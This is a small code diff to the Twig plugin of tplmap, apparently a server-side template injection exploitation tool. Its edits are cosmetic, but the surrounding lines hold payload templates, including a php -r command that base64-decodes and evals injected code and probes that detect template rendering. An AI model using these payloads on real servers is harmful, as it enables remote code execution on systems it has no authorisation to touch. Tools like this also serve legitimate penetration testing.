@@ -1,6 +1,5 @@
 from tplmap.plugins.languages import bash, php
 from tplmap.utils import rand
-from tplmap.utils.loggers import log
 
 
 class Twig(php.Php):
@@ -21,8 +20,7 @@ class Twig(php.Php):
                     # {{7*'7'}} and a{#b#}c work in freemarker as well
                     # {%% set a=%i*%i %%}{{a}} works in Nunjucks as well
                     "test_render": '"%(s1)s\n"|nl2br' % {"s1": rand.randstrings[0]},
-                    "test_render_expected": "%(res)s<br />"
-                    % {"res": rand.randstrings[0]},
+                    "test_render_expected": "%(res)s<br />" % {"res": rand.randstrings[0]},
                 },
                 "write": {
                     "call": "inject",
@@ -34,7 +32,7 @@ class Twig(php.Php):
                     "call": "execute",
                     "evaluate": """php -r '$d="%(code_b64)s";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%%4,"=",STR_PAD_RIGHT)));'""",
                     "test_os": "echo PHP_OS;",
-                    "test_os_expected": "^[\w-]+$",
+                    "test_os_expected": r"^[\w-]+$",
                 },
                 "execute": {
                     "call": "render",
